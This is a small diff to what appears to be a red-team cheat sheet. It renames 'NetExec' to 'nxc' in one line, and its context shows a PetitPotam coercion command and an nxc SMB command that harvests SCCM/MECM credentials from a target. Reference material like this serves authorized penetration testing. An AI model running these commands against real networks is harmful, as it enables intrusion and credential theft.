@@ -326,7 +326,7 @@ python3 PetitPotam.py {{LHOST:ip}} {{TARGET:ip}}
 ---
 
 ## loot sccm mecm creds
-Hunt for SCCM/MECM creds via NetExec module.
+Hunt for SCCM/MECM creds via nxc module.
 
 ```bash
 nxc smb {{TARGET:ip}} -u "{{USERNAME:str:user}}" -p "{{PASSWORD:str:pass}}" -M sccm
